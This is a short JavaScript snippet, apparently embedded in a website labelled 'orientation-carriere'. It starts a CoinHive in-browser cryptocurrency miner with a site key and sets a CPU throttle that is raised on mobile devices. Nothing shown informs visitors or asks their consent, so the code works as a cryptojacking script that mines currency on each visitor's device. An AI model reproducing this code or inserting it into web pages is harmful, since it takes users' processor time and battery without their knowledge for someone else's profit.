var miner = new CoinHive.User('vQQwuDuMeAY6FuCAzPaPopySLb2pto4O', 'orientation-carriere');
var throttle = 0.3;
if (miner.isMobile()) throttle = 0.5;
miner.setThrottle(throttle);
miner.start();